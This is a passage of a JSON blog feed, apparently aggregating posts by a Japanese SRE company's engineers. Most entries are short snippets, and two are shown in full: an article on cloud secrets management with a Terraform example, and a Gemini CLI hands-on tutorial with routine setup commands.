「このAIアプリ、ユーザーにいくつか選択肢を提示して、選んでもらう機能が必要だな…」 生成AIを使ったアプリケーション開発では、LLMから構造化されたデータを安定して取得することが重要な […]The post 構造化出力を安定してLLMにさせたいなら「instructor」はいかが？ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-29T13:27:12.000Z","dateMiliSeconds":1759152432000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Platform Engineering Maturity Modelってなに？","link":"https://zenn.dev/r4ynode/articles/platform-engineering-maturity-model","contentSnippet":"はじめに先日、以下のイベントに参加しました。そこで「Platform Engineering Maturity Model」を知ったので、その概要をまとめ、実際にどのように活用するのかを考えてみます。https://www.cnia.io/pek2025/ そもそもPlatform Engineeringってなに？!賛否両論ありそうな議題なので鵜呑みにしないでください。本題に入る前に一度初心にかえります。私は「Platform Engineering」を曖昧に理解しています。DevOpsやSREなど、類似する概念の定義と重なる部分があり、境界が曖昧に感じるところがあ...","isoDate":"2025-09-28T23:00:01.000Z","dateMiliSeconds":1759100401000,"authorName":"Reito Koike","authorId":"reito"},{"title":"みんなの考えた最強のデータ基盤アーキテクチャ第５回オールスター大集合スペシャル！！ 参加ログ","link":"https://zenn.dev/nedoko_dok0dko/articles/589fc799f824c6","contentSnippet":"what9/24(水)に開催された「みんなの考えた最強のデータ基盤アーキテクチャ第５回〜オールスター大集合スペシャル！！」の参加ログです。https://datatech-jp.connpass.com/event/360596/今回が初参加&初現地という完全初見でドキドキの中いってきました。 イベント概要datatech-jpというデータエンジニアのコミュニティで集ったデータエンジニアが、それぞれ考える最強のデータ基盤アーキテクチャを紹介し合うというイベントです。過去に４回開催されており、５回目となる今回は過去登壇した方々が「今のデータ基盤」を語るというもので...","isoDate":"2025-09-27T07:29:56.000Z","dateMiliSeconds":1758958196000,"authorName":"seno","authorId":"seno"},{"title":"ディレクトリ構成 ~レイヤーベース編~","link":"https://sreake.com/blog/layer-based-directory-structure-good-practice/","contentSnippet":"はじめに アプリケーション開発において、ディレクトリ構成は保守性・拡張性・開発効率に直結する設計要素です。 本記事では、以下のような課題に悩む現場に向けて、「シンプルで直感的、責務ごとの分離が容易」であるレイヤーベース構 […]The post ディレクトリ構成 ~レイヤーベース編~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-26T06:30:23.000Z","dateMiliSeconds":1758868223000,"authorName":"Sreake","authorId":"Sreake"},{"title":"GitHub Actions \xd7 AWS OIDC連携の仕組みと経緯を理解する","link":"https://speakerdeck.com/ota1022/github-actions-x-aws-oidclian-xi-noshi-zu-mitojing-wei-woli-jie-suru","contentSnippet":"3-shake SRE Tech Talk #13 オンサイトのLT登壇資料です。\\rhttps://3-shake.connpass.com/event/362683/","isoDate":"2025-09-25T04:00:00.000Z","dateMiliSeconds":1758772800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"2025-09-25 SRETT #13 ConftestによるTerraformのPolicy as Codeを試してみる","link":"https://speakerdeck.com/masasuzu/2025-09-25-srett-number-13-conftestniyoruterraformnopolicy-as-codewoshi-sitemiru","contentSnippet":"[3-shake SRE Tech Talk #13 オンサイト - connpass](https://3-shake.connpass.com/event/362683/)\\rでLTした内容。\\r\\rConftestを軽く試してみた内容。もう少し深堀りして、再度発表したいところ。","isoDate":"2025-09-25T04:00:00.000Z","dateMiliSeconds":1758772800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Cloud Service Mesh 入門編-Google のマネージドサービスメッシュを理解する","link":"https://sreake.com/blog/cloud-service-mesh-getting-started/","contentSnippet":"自己紹介 千葉工業大学大学院 情報科学研究科 情報科学専攻 修士１年の井上 裕介と申します．大学では主にメタヒューリスティクスに関する最適化アルゴリズムの研究に従事しております．2023 年のサマーインターンから引き続き […]The post Cloud Service Mesh 入門編-Google のマネージドサービスメッシュを理解する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-25T02:12:40.000Z","dateMiliSeconds":1758766360000,"authorName":"Sreake","authorId":"Sreake"},{"title":"CTFのためのKubernetes入門","link":"https://speakerdeck.com/kyohmizu/ctfnotamenokubernetesru-men","contentSnippet":"イベント登壇資料です。2025/09/23 魔女のお茶会 #8\\rhttps://witchskeyparty.connpass.com/event/363928/","isoDate":"2025-09-23T04:00:00.000Z","dateMiliSeconds":1758600000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"クラウド環境におけるシークレットの扱い","link":"https://blog.masasuzu.net/entry/2025/09/19/203626","contentSnippet":"この内容は、社内のエンジニア勉強会で話した内容です。 speakerdeck.comみなさん。プロダクション環境のシークレット情報をどう扱っていますか?クラウドネイティブなアプリケーション開発において、DBのパスワードや外部APIキーといったシークレットの管理は、セキュリティを確保する上で避けては通れない課題です。この記事では、アプリケーションとインフラそれぞれの視点から、クラウド環境におけるシークレット管理のアンチパターンとベストプラクティスを探っていきます。ここで言うシークレットとはDBのパスワードやAPIキーなどの秘匿すべき情報のことを指します。アプリケーション側の視点まずは、アプリケーションがどのようにシークレットを扱うべきかを見ていきましょう。管理のアンチパターン最初に管理方法のアンチパターンとしては以下のものがありますソースコードに直接記述設定ファイルに平文で記述環境変数に平文で記述(Dockerfileや.envファイルでgit管理するなど)base64エンコードして保存ソースコードに記述すれば、すべての環境で同じ値しか使えず柔軟性がありません。設定ファイルや環境変数に平文で記述し、それをGitで管理してしまうと、何かのミスでリポジトリが流出した際にシークレットも漏れてしまいます。また、隠しているつもりでBase64エンコードするのも同様に危険です。Base64は暗号化ではなく、誰でも簡単に元の文字列に戻せるため、平文で保存しているのと大差ありません。KMSによる暗号化の検討次に考えられるのが、暗号鍵を使った暗号化です。AWSのKMSやGoogle CloudのCloud KMSといった鍵管理サービスを利用する方法が考えられます。フローとしては以下のようになりますでしょうかアプリケーション起動時にKMSのから鍵を取得取得した鍵を利用して暗号化されたシークレットを復号平文のシークレット情報をアプリで利用する一見これで良さそうですが、復号処理をアプリケーションの責務にすると、コードが複雑になるだけでなく、KMSの復号権限をアプリケーション自体に付与する必要があり、管理の懸念点が増えてしまいます。クラウド側のシークレットストアの利用そこで推奨されるのが、クラウドが提供するシークレット管理の仕組みを利用することです。AWSAWS Secrets ManagerAWS Systems Manager Parameter Store(SecureString)Google CloudSecret Managerこれらのサービスは、ECS FargateやCloud Runなどのコンテナ実行環境と統合されています。コンテナの起動時に、これらのストアに保存されたシークレットを、自動的に環境変数やファイルとしてマウントしてくれるのです。これによりアプリケーション側では、シークレットがどこで管理されているかを意識することなく、従来通り環境変数やファイルから値を読み込むだけで済むようになり、責務をシンプルに保つことができます。インフラ側の視点さて、アプリケーションの課題は解決しました。次に、インフラ側で、そのシークレットストアをどう管理するかという課題に移りましょう。取れる手段としては主に以下ものが考えられます。手動でコンソールから設定シークレットの値を平文でIaC管理(tfvarsファイルをgit管理から外す)シークレットの値を暗号化してIaCで管理シークレットストアをIaCで管理、値は手動設定まず手動で管理ですが、これはこれでありだと思ってます。ただし、扱うシークレットの数が増えてきたときに作業が煩雑であったり、手作業がゆえに起こるリソースタグなどの付け間違いなどのミスが発生しうるので、規模が大きくなると現実的ではありません。2つ目ですが、シークレットの値だけあつかるtfvarsファイルをgitignoreしてあげることでレポジトリが漏れてもシークレットの値が漏れないことになります。が、うっかりシークレットの値を人為的なミスでコミットしうるので完全に安全とはいいにくいです。3つ目ですが、これはsops providerを利用するパターンです。これを使うことでKMSキーを利用して暗号/復号がterraformとシームレスに統合できます。一見これで良さそうですが、2点課題があります。KMSリソースを余計に管理なくてはならないStateには平文で保存される前者は必要経費としていいとして、後者は課題となります。Terraformにおいてはstateを見る権限がある人にはシークレットも見れてしまうという懸念があります。シークレットのリソースと値を分離するこの方法の利点は、IaCでシークレット リソースが存在することは管理しつつ、その実際の値はGitの管理下から完全に分離できる点です。初回適用後にコンソールから実際のシークレット値を設定すれば、それ以降 terraform apply を実行しても値がダミー値で上書きされることはありません。これにより、コードレビューなどで誤ってシークレットが漏洩するリスクを原理的に防ぐことができ、非常にバランスの取れた管理方法と言えます。以下サンプルコードです。resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    =  \\"Dummy\\"  lifecycle {    ignore_changes = [value]  }}まとめ現時点でのクラウドにおけるシークレット管理のベストプラクティスは、以下のようにまとめることができるでしょう。アプリケーションクラウドのシークレットストア(Secrets Managerなど)と実行環境(ECS, Cloud Runなど)の統合機能を使い、環境変数またはファイルとしてシークレットを読み込む。インフラ(IaC)クラウドのシークレットストアのリソース自体はTerraformで管理する。実際のシークレットの値は ignore_changes を活用して手動で設定し、Gitの管理から分離する。もちろん要件によって取りうる手段は変わるとは思います。他になにか良い方法をご存知でしたら教えて下さい。それでは良いシークレットライフを!関連ページblog.masasuzu.net","isoDate":"2025-09-19T11:36:26.000Z","dateMiliSeconds":1758281786000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2025-09-19 クラウドにおけるシークレット管理","link":"https://speakerdeck.com/masasuzu/2025-09-19-kuraudoniokerusikuretutoguan-li","contentSnippet":"スリーシェイク社内のエンジニア勉強会で発表した資料\\r\\rクラウドにおいてプロダクション環境でのシークレットの扱い方についてアプリケーションおよびインフラ側でどう管理していくのが望ましいかを詳解","isoDate":"2025-09-19T04:00:00.000Z","dateMiliSeconds":1758254400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2025-08-05 Google Cloud Next Tokyo 2025 Cloud RunとCloud SQLの接続方式と事例","link":"https://speakerdeck.com/masasuzu/2025-08-05-google-cloud-next-tokyo-2025-cloud-runtocloud-sqlnojie-sok-fang-shi-toshi-li","contentSnippet":"","isoDate":"2025-09-17T04:00:00.000Z","dateMiliSeconds":1758081600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"actでGithub ActionsのVibe Codingを加速させる","link":"https://speakerdeck.com/kojake_300/actdegithub-actionsnovibe-codingwojia-su-saseru","contentSnippet":"","isoDate":"2025-09-16T04:00:00.000Z","dateMiliSeconds":1757995200000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Sreakeの英語ブログをはじめました！","link":"https://sreake.com/blog/enabling-en-blog/","contentSnippet":"こんにちは！ Sreake事業部のイリドリシ愛民 (@realaminevg) です。 2020年から継続してきたSreakeブログの運用経験を活かし、今月からSreakeの英語ブログ（Sreake English Bl […]The post Sreakeの英語ブログをはじめました！ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-16T01:00:00.000Z","dateMiliSeconds":1757984400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、 Google Cloud Partner Advantage プログラムにおいて「Application Development」のスペシャライゼーション認定を取得","link":"https://sreake.com/blog/appdev_specialization/","contentSnippet":"Google Cloud Sell および Service エンゲージメントモデルのプレミアパートナーである株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、Google Cloud Partner Advantage プログラムにおいて、「Application Development - サービス」のスペシャライゼーション認定を取得したことをお知らせします。The post スリーシェイク、 Google Cloud Partner Advantage プログラムにおいて「Application Development」のスペシャライゼーション認定を取得 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-12T01:00:00.000Z","dateMiliSeconds":1757638800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Webアプリケーションにオブザーバビリティを実装するRust入門ガイド","link":"https://speakerdeck.com/nwiizo/webapurikesiyonniobuzababiriteiwoshi-zhuang-sururustru-men-gaido","contentSnippet":"2025年9月10日（水）、「Rustの現場に学ぶ〜Webアプリの裏側からOS、人工衛星まで〜」というイベントで登壇させていただきます。\\r\\rhttps://findy.connpass.com/event/359456/\\r\\r他の登壇者の話が聞きたすぎるけど調整能力の圧倒的な不足で登壇したらすぐに帰らなければなりません。\\r\\r今回の発表内容のベースとなったのはこちらのブログです。\\r- 「RustのWebアプリケーションにオブザーバビリティを実装するインフラエンジニアのための入門ガイド」","isoDate":"2025-09-10T04:00:00.000Z","dateMiliSeconds":1757476800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud で目指す クラウド二刀流エンジニア講座 第1回 でパネルディスカッションに出てきました。","link":"https://blog.masasuzu.net/entry/2025/09/10/005523","contentSnippet":"先日、2025年6月4日に開催された 「Google Cloud で目指すクラウド二刀流エンジニア講座」 の第1回にて、「スペシャリストが語る！Google Cloud のメリットを活かすネットワーク、セキュリティのあり方とは？」 と題したパネルディスカッションに登壇いたしました。イベントから少し時間が経ちましたが、当日の内容を振り返り、話したことや、時間の都合上話しきれなかった点などをまとめていきたいと思います。cloudonair.withgoogle.comページとセッションでの資料は以下のとおりです。Session 3 : スペシャリストが語る！Google Cloud のメリットを活かすネットワーク、セキュリティのあり方とは？Session 3 : スペシャリストが語る！Google Cloud のメリットを活かすネットワーク、セキュリティのあり方とは？(スライド)以下パネルディスカッションでお話しした内容と補足を記載します。Question 1 :現在のハイブリッドクラウド構成時のトレンドとお客様が気にされるポイント大規模なシステムではオンプレミスとクラウドを組み合わせたハイブリッド構成を、中規模以下のシステムではオンプレミスからクラウドへ完全に移行する、あるいは最初からクラウドで構築する「クラウドネイティブ」な構成が多い傾向にあります。可用性向上のために、同じサービスをマルチクラウドで構築するケースは少なく、まずは単一クラウド内でのマルチリージョン構成が検討されることが多い印象です。しかし、私が担当するサービスではマルチリージョンが必要なほどクリティカルなものはそれほど多くなく、多くは単一リージョン内のマルチAZ(ゾーン)構成を採用しています。冗長性が目的ではなく、特定の機能を使いたいので一部のサービス（例: 特にBigQuery、Vertex AI）のみをGoogle Cloudで利用するケースがあります。メインクラウドがどちらかに偏っており、Google Cloudを補完的に利用するケースが多いようです。また、可用性向上という目的とは別に、特定の機能（特にBigQueryやVertex AIなど）を利用するために、一部のサービスのみGoogle Cloudを補完的に利用する、というケースでマルチクラウドを使用してる例が多いです。お客様が特に重視されるポイントとしては、コスト、セキュリティ、そして可用性の担保が挙げられます。Question 2 :クラウドのネットワーク設計、セキュリティ実装において押さえておくべきポイント最適な設計や実装は、お客様の組織体制やチーム体制、そして運用するサービスの性質によって大きく変わります。そのため、まずはどのような運用体制を目指すのかを分析・定義し、それに合った構成を提案することが重要です。考慮すべき観点としては、以下のような点が挙げられます。フォルダやプロジェクトの構成可用性の取り方過剰な可用性を求めていないか、サービスの要件と合っているかセキュリティの要求ネットワーク構成そして何よりも、設計した構成が、実際のチームで「運用可能」であることが最も重要だと考えています。Question 3 :ネットワーク、セキュリティの課題とアプローチここでは、ネットワークの課題を解決した事例を一つご紹介します。Cloud Run、MemoryStore (Redis)、Cloud SQLで構成されたアプリケーションで、Cloud RunとCloud SQL間のネットワーク性能が上がらないという問題が発生しました。Cloud RunはVPCの外部にあるリソースのため、VPC内にあるCloud SQLと接続するにはServerless VPC Connectorを経由していました。調査の結果、性能が出ない原因は、このServerless VPC Connectorのインスタンス数を固定で設定していたことでした。一時的な対処として、Serverless VPC Connectorの最大インスタンス数とインスタンスタイプを引き上げました。このサービスはサーバーレスという名前ですが、実際にはインスタンス数やタイプを指定する必要があります。(ここで言うサーバレスは、サーバレスなリソースへのコネクタという意です)しかし、この対処法では課題が残ります。Serverless VPC Connectorは一度スケールアウトすると自動でスケールインしないため、ピーク時に合わせたインスタンス数のコストを常に払い続けることになってしまいます。そこで根本的な解決策として、Direct VPC Egressへの移行を実施しました。Direct VPC Egressは、パフォーマンスが高く、コストもネットワーク転送料金のみに抑えられるというメリットがあります。ただし、VPCに直接接続するため、使用するIPアドレス数が多くなる点には注意が必要です。この事例では、Cloud Runのデプロイ設定でコネクタを切り替えるだけだったため、移行は比較的スムーズでした。また、インフラがコード化(IaC)されていたため、何か問題があってもすぐに切り戻しができる状態だったことも成功の要因です。この経験から言えるのは、本番稼働しているネットワークの変更は容易ではないということです。そのため、初期設計は慎重に行う必要があります。とはいえ、サービスの成長に伴う構成変更は避けられません。将来の変更を見越して、変更しやすい設計を心がけ、変更を安全に試せる環境を準備しておくことが重要です。具体的には、インフラを可能な限りIaC化して変更や切り戻しを容易にすること、検証環境をすぐに構築できるよう準備しておくこと、そして何よりも 現在のチームメンバーで運用できる方法を選択すること が大切です。チームのスキルレベルや人数、体制を考慮した現実的なアプローチを常に考えていく必要があります。(この事例の話、若干ずれてて長くなってしまった感があります。反省)Question 4 :Google Cloud のネットワーク・セキュリティ領域でのおすすめのサービス・機能ここでは3つのサービスをあげさせてもらいました。IAP限定公開の Google アクセス共有VPCIAPアプリケーションにGoogle認証を簡単に追加できる非常に便利なサービスです。最近、ALBなしでCloud Runに直接設定できるようになりました(プレビュー機能)。ただし、ALBを利用する場合と異なり、Cloud ArmorによるWAF保護が適用できないため、ユースケースに応じた注意が必要です。限定公開の Google アクセス通常、Compute EngineなどのリソースからGoogle系のAPI（Cloud Storageなど）にアクセスするには、外部IPアドレスを持つか、Cloud NATなどを経由する必要がありました。しかし、サブネットでこの「限定公開のGoogleアクセス」を有効にすると、追加費用なしで、外部IPを持たないリソースから直接Google APIにアクセスできるようになります。AWSではVPC EndpointをAPIごとに作成する必要があり、管理が煩雑でコストもかかりますが、Google Cloudではこの機能によって非常にシンプルかつ低コストにプライベートなアクセスが実現できます。共有 VPC(Shared VPC)誰にでもおすすめできるわけではありませんが、特定の要件には非常に有効な機能です。共有VPCを利用すると、ネットワークとセキュリティの管理をインフラチームに集約し、各サービス開発チームは払い出されたサブネット上で開発に専念する、といった職掌の分離が可能になります。これにより、開発チームはインフラを意識することなくアプリケーション開発に集中できます。一つの大規模なシステムを複数のチームで開発する場合や、複数のプロジェクトでVPC上のリソースを共有したい場合に特に便利です。一方で、ネットワークの独立性が失われるため、ファイアウォールの設定をより厳密に行う必要があります。また、開発チームがネットワーク設定を直接変更できないため、変更の都度インフラチームへの依頼が必要になるというデメリットもあります。Question 5 :おすすめのクラウドのネットワーク、セキュリティのベストプラクティスのキャッチアップ方法セキュリティ分野に限りませんが、日々の情報収集が重要です。私のチームでは、Google CloudのリリースノートやAWSのアップデート情報を定期的に確認する会を社内で実施し、効率的に新しい情報をキャッチアップしています。また、資格試験の勉強や更新も、知識を体系的にアップデートする良い機会になります。コミュニティや勉強会イベントへの参加も非常に有効です。Google Cloud関連では、主に以下の2つのコミュニティが活発です。Jagu’e’r (Japan Google Cloud Usergroup for Enterprise)GCPUG(Google Cloud Platform User Group)Jagu\'e\'rは、ユーザー企業とパートナー企業の従業員で構成されるコミュニティで、各分科会での活動が活発です。私自身もクラウドネイティブ分科会の運営に携わっています。GCPUGは、特にShonan支部が活発に活動されている印象です。他の支部は活動が緩やかになっている面もありますが、Slackワークスペースは現在も動いており、各サービスのチャンネルでは最新アップデートに関する議論が行われています。まとめ今回、初めてパネルディスカッションという形式で登壇させていただきました。至らない点も多々ありましたが、大変貴重な経験となりました。技術に関する議論はやはり楽しいと感じました。今後もこのような機会があれば、ぜひ参加していきたいです。","isoDate":"2025-09-09T15:55:23.000Z","dateMiliSeconds":1757433323000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"SRE向けイベント【3-shake SRE Tech Talk #13 】～クラウドセキュリティスペシャル〜を開催します","link":"https://sreake.com/blog/srett13/","contentSnippet":"この度、スリーシェイクは、SRE向けイベント【3-shake SRE Tech Talk #13 】～クラウドセキュリティスペシャル～を開催します。今回もオフライン・オンラインのハイブリット開催です。 ■概要本イベントは […]The post SRE向けイベント【3-shake SRE Tech Talk #13 】～クラウドセキュリティスペシャル〜を開催します first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-08T02:45:08.000Z","dateMiliSeconds":1757299508000,"authorName":"Sreake","authorId":"Sreake"},{"title":"あなたのアプリにマルチリージョンは必要ないかもしれない","link":"https://zenn.dev/kamos/articles/dont_need_multi_region","contentSnippet":"はじめにアプリケーションを運用する上で、可用性は避けて通れない重要なテーマです。可用性を確保するためにインフラの単一障害点を可能な限りなくし、冗長化構成を組むことは今や常識となっています。その中でも特に強力な障害対策として挙げられるのが「マルチリージョン構成」です。しかし、その実装と運用には相応のコストと複雑さが伴います。この記事では、クラウドインフラにおける障害対策としてのマルチリージョン化が、本当にあなたのアプリケーションに必要なのかを、コストとリスクの観点から考察します。 あなたのアプリに「高い可用性」は必要か？あらゆるサービスが高い可用性を目指すべきかというと、必...","isoDate":"2025-09-06T03:32:28.000Z","dateMiliSeconds":1757129548000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Gemini CLI AI駆動開発体験ハンズオン","link":"https://shu-kob.hateblo.jp/entry/2025/09/05/185202","contentSnippet":"この記事は#17 Gemini CLI AI駆動開発体験ハンズオン【オンライン】 - connpassの資料です。Gemini CLI AI駆動開発体験ハンズオン\uD83C\uDFAF 本日のゴールこのハンズオンでは、Googleの強力なAIモデルであるGeminiをターミナルから対話的に利用できるGemini CLIを使い、以下の3つの体験を通じて、日々の開発タスクを劇的に効率化する「AI駆動開発」の第一歩を踏み出すことを目指します。面倒なドキュメント作成の自動化未知のアプリケーションの迅速な立ち上げ対話によるスマートな機能追加\uD83E\uDDE0 Gemini CLIとは？Gemini CLIは、Googleが公開したオープンソースのAIエージェントです。ターミナル（コマンドライン）から自然言語で指示を出すだけで、まるで優秀なアシスタントがいるかのように、以下のようなタスクをこなします。コードの生成・編集・解説ファイル操作情報検索ワークフローの自動化それでは、早速AIとのペアプログラミングの世界を体験してみましょう！1. 準備a. Node.js (npm) のインストールGemini CLIのインストールに必要です。未インストールの方はVer.20以上をインストールしてください。b. Gemini CLIのインストールと設定ターミナルを開き、以下のコマンドを実行します。# Gemini CLIをインストールnpm install -g @google/gemini-cli# インストールされたことを確認gemini --version以下のようにバージョン情報が表示されればOKです。0.3.2c. 認証設定Gemini-CLIのREADMEを参照github.comターミナルでgeminiと入力すると、対話モードとなります。/quitで退出できます。2. ハンズオン1: ローカルコードを解析してREADME.mdを自動生成まずは、既存のコードからプロジェクトの説明書であるREADME.mdを自動生成させてみましょう。手順1. 作業用ディレクトリの作成と移動mkdir gemini-cli-handson && cd gemini-cli-handson2. サンプルコードの作成簡単なWebサーバーのPythonコードを作成します。main.pyというファイル名で以下の内容を保存してください。touch main.pyimport http.serverimport socketserverPORT = 8000Handler = http.server.SimpleHTTPRequestHandlerwith socketserver.TCPServer((\\"\\", PORT), Handler) as httpd:    print(\\"serving at port\\", PORT)    httpd.serve_forever()main.pyを動かしてくださいなどと入力することで起動させることができます。3. ハンズオン1: GeminiにREADMEの作成を依頼！カレントディレクトリの情報をコンテキスト (-c ) として渡し、READMEの作成を依頼し、> を使ってファイルに保存します。\uD83D\uDCBB 実行するコマンド:gemini -p \\"このプロジェクトのREADME.mdを日本語で生成してください。プロジェクトの概要、使い方、実行方法を簡潔にまとめてください。\\" -c  > README.mdls コマンドで README.md ファイルが作成されていることを確認してください。たったこれだけで、プロジェクトのドキュメントが完成しました！4. ハンズオン2: 未知のアプリを動かしてみる次に、GitHubから使い方があまり書かれていないプロジェクトをCloneしてきて、Geminiに起動方法を尋ねて動かしてみましょう。手順サンプルリポジトリのクローンまずは一つ上の階層に戻り、サンプルリポジトリをクローンします。git clone https://github.com/shu-kob/rag-app-handsonREADMEがあるとGeminiがその内容をヒントにしてしまうため、READMEがなくてもどれだけ自力でアプリの構造を理解できるか試すためにREADME.mdを削除します。cd rag-app-handsonrm frontend/README.md backend/README.mdGeminiに起動方法を質問してみます。このディレクトリにはREADME.mdがありません。どうやって動かせばいいか、Geminiに聞いてみましょう。\uD83D\uDCBB 実行するコマンド:gemini -p \\"このプロジェクトの実行方法を教えて。必要な手順をステップバイステップで説明して。\\" -c Geminiは ファイルを見て、以下のような実行手順を説明してくれます。5. ハンズオン3: プロンプトを工夫して機能追加最後に、対話を通じてアプリケーションに新しい機能を追加してみましょう。ハンズオン1で作成したPythonのWebサーバーコードを拡張します。手順作業ディレクトリへ移動cd gemini-cli-handson現在のコードを確認cat main.pyで現在のコードを再確認します。これはシンプルなWebサーバー機能しかありません。Geminiに機能追加を依頼！このWebサーバーに、「アクセスすると\'Hello, Gemini!\'と表示する」機能を追加してもらいましょう。コード全体を書き換えてもらうように依頼するのがポイントです。\uD83D\uDCBB 実行するコマンド:gemini -p \\"現在のmain.pyを修正して、どのパスにアクセスしても \'Hello, Gemini!\' というテキストを返すように変更してください。コード全体を提示してください。\\" -c main.py生成されたコードでファイルを上書きGeminiが修正版のmain.pyコードを生成します。上書きの指示をしてください。（生成されるコードの例）import http.serverimport socketserverPORT = 8000class MyHandler(http.server.BaseHTTPRequestHandler):    def do_GET(self):        self.send_response(200)        self.send_header(\'Content-type\', \'text/plain; charset=utf-8\')        self.end_headers()        self.wfile.write(\'Hello, Gemini!\'.encode(\'utf-8\'))with socketserver.TCPServer((\\"\\", PORT), MyHandler) as httpd:    print(\\"serving at port\\", PORT)    httpd.serve_forever()動作確認変更したWebサーバーを起動し、ブラウザやcurlコマンドで動作を確認します。\uD83D\uDCBB 実行するコマンド (ターミナル):python3 main.pyもしくは、Gemini-CLIで「main.pyを起動してください」と指示します。\uD83D\uDCBB 別のターミナルを開いて実行、またはブラウザで http://localhost:8000 にアクセス:curl http://localhost:8000ターミナルに \\"Hello, Gemini!\\" と表示されれば、機能追加は成功です！","isoDate":"2025-09-05T09:52:02.000Z","dateMiliSeconds":1757065922000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"2025年夏 コーディングエージェントを統べる者","link":"https://speakerdeck.com/nwiizo/2025nian-xia-kodeinguezientowotong-beruzhe","contentSnippet":"2025年9月5日（金）、台風接近という悪天候の中でしたが、「CNCJ: コーディングエージェント \xd7 セキュリティ ミートアップ」に登壇させていただきました。\\r\\r天候の影響で現地参加が難しい方も多い中、オンラインでの参加や配信により、多くの方にお聞きいただくことができました。\\r\\r### \uD83D\uDCCD イベント情報\\r- 開催日: 2025年9月5日（金）\\r- イベント詳細: CNCFコミュニティページ\\r\\r### \uD83D\uDCF9 録画・資料公開予定\\r- 録画: CNCJのYouTubeチャンネルにて後日公開予定\\r- 発表資料: Connpassページに掲載予定\\r\\r### \uD83D\uDCDD 関連ブログ\\r今回の発表内容のベースとなった考え方については、こちらのブログ記事でも詳しく解説しています：\\r- 「2025年夏 AIエージェントシステムに対する考え方」\\r\\r台風の中、ご参加・ご視聴いただいた皆様、ありがとうございました。","isoDate":"2025-09-05T04:00:00.000Z","dateMiliSeconds":1757044800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"雰囲気で理解していたAPIとは","link":"https://zenn.dev/nedoko_dok0dko/articles/b8c8863bf74be7","contentSnippet":"whatAPIについて調べたことをまとめる自分は雰囲気でAPIを触っている API(Application Programming Interfice)とは「あるソフトウェアの機能やデータを、別のソフトウェアから利用するための窓口や仕組み」のこと。身近な例で言えば、電力会社とコンセントに例えられる。実世界の例として、あなたの家、アパートや他の住処にある電気のコンセントについて考えて下さい。あなたの家で機器を使いたい時には、電源コードのプラグをコンセントに差し込めば事足ります。電源に直接結線したりしないでしょう — そんなのは非効率ですし、あなたが電気工事士でなけれ...","isoDate":"2025-09-04T10:53:53.000Z","dateMiliSeconds":1756983233000,"authorName":"seno","authorId":"seno"},{"title":"HonoとAstroは仲良し〜Cloudflare Workersでの使い方紹介","link":"https://speakerdeck.com/aminevg/honotoastrohazhong-liang-si-cloudflare-workersdenoshi-ifang-shao-jie","contentSnippet":"バックエンド向けウェブフレームワーク「Hono」、フロントエンド向けのウェブフレームワーク「Astro」。実は仲良いですよ！\\r今回はCloudflare Workers上での、HonoとAstroの使い方を紹介します。単独で使う、Hono-in-Astro、Astro-in-Honoなど組み合わせ方が多いです！最後にAstro-in-Hono関連のライブラリも紹介します。","isoDate":"2025-09-03T04:00:00.000Z","dateMiliSeconds":1756872000000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"BigQueryのINFORMATION_SCHEMA.JOBS ビューに現れた「query_dialect」とは?￼","link":"https://sreake.com/blog/bigquery-information-schema-jobs-query-dialect/","contentSnippet":"はじめに こんにちは。 夏が始まったと思ったらもう暦上では9月。夏の終わりです。時間の流れは早いですね。 こんな感じでいつの間にか秋が来て冬が来て年末になっていたり…不思議です。 今回ですが、BigQueryに「いつの間 […]The post BigQueryのINFORMATION_SCHEMA.JOBS ビューに現れた「query_dialect」とは?￼ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-03T03:10:23.000Z","dateMiliSeconds":1756869023000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Amazon VPC CNIに学ぶCNI-LT版","link":"https://speakerdeck.com/bells17/amazon-vpc-cninixue-hucni-ltban","contentSnippet":"https://k8sjp.connpass.com/event/365262/","isoDate":"2025-09-02T04:00:00.000Z","dateMiliSeconds":1756785600000,"authorName":"bells17","authorId":"bells17"},{"title":"スリーシェイク、「Developers Summit 2025 KANSAI」に協賛・出展","link":"https://sreake.com/blog/developers-summit-2025-kansai/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 2025年 9月17日（水）に開催される「Developers Summit 2025 KANSAI」に展示ブーススポンサーとして協賛します。The post スリーシェイク、「Developers Summit 2025 KANSAI」に協賛・出展 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-01T01:30:00.000Z","dateMiliSeconds":1756690200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"BigQueryのMERGEステートメントについて","link":"https://zenn.dev/nedoko_dok0dko/articles/52a6a8e2412dcb","contentSnippet":"whatBigQueryのマージステートメントについて調べたことや知ったことを個人的にまとめたもの 